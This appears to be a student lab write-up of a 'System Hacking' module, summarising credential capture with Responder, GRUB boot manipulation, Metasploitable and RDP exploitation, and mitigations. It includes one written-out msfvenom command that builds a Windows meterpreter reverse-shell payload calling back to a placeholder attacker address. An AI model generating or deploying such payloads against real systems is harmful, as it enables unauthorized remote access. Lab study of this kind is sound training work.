# 06 – System Hacking ⚙️

## 📌 Lab Overview

This module focuses on gaining access to target systems through credential attacks, exploitation techniques, payload generation, and remote service abuse.

Activities were performed in an isolated lab environment using Kali Linux as the attacker machine and Windows 10 / Metasploitable as target systems.

---

## 🎯 Objectives

- Capture credentials using network poisoning techniques  
- Exploit vulnerable systems  
- Generate and deploy payloads  
- Gain remote access through exposed services  
- Understand post-exploitation concepts  

---

## 🛠 Tools Used

- Responder  
- Metasploit Framework  
- MSFVenom  
- Kali Linux  
- Windows 10  
- Metasploitable 2  

---

## 🔍 Methodology

### 🎯 Active Credential Capture using Responder

Responder was used to perform LLMNR/NBT-NS/mDNS poisoning attacks to capture authentication hashes.

Protocols targeted:

- LLMNR (Link-Local Multicast Name Resolution)  
- NBT-NS (NetBIOS Name Service)  
- mDNS (Multicast DNS)  
- SMB authentication interception  

This technique allowed capturing NTLM hashes when systems attempted network resource resolution.

---

### 🐧 Exploiting Kali Linux using GRUB

GRUB bootloader manipulation was used to gain unauthorized access to the system by modifying boot parameters.

This demonstrated:

- Physical access attack risks  
- Privilege escalation possibilities  
- Importance of bootloader security  

---

### 💻 Exploiting Metasploitable

Metasploitable was targeted to practice exploitation of intentionally vulnerable services.

Activities included:

- Identifying vulnerable services  
- Exploiting known service weaknesses  
- Gaining system-level access  

This helped understand real exploitation workflow.

---

### 🧨 Payload Creation using MSFVenom

MSFVenom was used to generate custom payloads for exploitation scenarios.

Example:

** msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > payload.exe **

Payloads enable:

- Reverse shell access  
- Remote command execution  
- Persistence mechanisms  

---

### 🖥 Exploiting Windows 10 via RDP Service

Remote Desktop Protocol exposure was analyzed to understand remote access risks.

Activities included:

- Identifying open RDP port (3389)  
- Attempting authentication-based access  
- Understanding remote service attack surface  

---

## 📊 Findings

- Successfully captured authentication hashes via network poisoning  
- Gained access through exploitation of vulnerable services  
- Generated functional reverse shell payloads  
- Identified remote access exposure through RDP  

---

## ⚠️ Risk Analysis

System hacking techniques may lead to:

- Unauthorized system access  
- Credential compromise  
- Privilege escalation  
- Persistent attacker presence  
- Full system takeover  

Weak network authentication mechanisms significantly increase risk.

---

## 🛡 Mitigation Recommendations

- Disable LLMNR and NetBIOS where not required  
- Implement strong password policies  
- Secure bootloader configurations  
- Restrict RDP exposure  
- Use multi-factor authentication  
- Monitor suspicious authentication attempts  

---

## 📝 Lab Outcome

Developed practical understanding of credential interception, exploitation techniques, payload generation, and remote access attack vectors within structured penetration testing scenarios.
